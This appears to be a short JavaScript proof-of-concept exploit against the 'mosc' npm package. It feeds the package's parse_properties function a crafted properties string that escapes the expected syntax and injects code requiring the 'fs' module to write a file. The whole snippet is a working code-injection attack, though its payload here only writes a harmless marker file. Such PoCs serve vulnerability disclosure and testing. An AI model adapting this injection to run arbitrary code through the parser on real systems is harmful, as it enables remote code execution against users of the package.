var A = require("mosc");
var a = new A({});
var key = "";
var attack_code = "fs=require('fs');fs.writeFile('Song');"
var properties = "{a:*1*; " + attack_code + " //*}"
var base ="";

var a = a.parse_properties(key,properties,{},{})
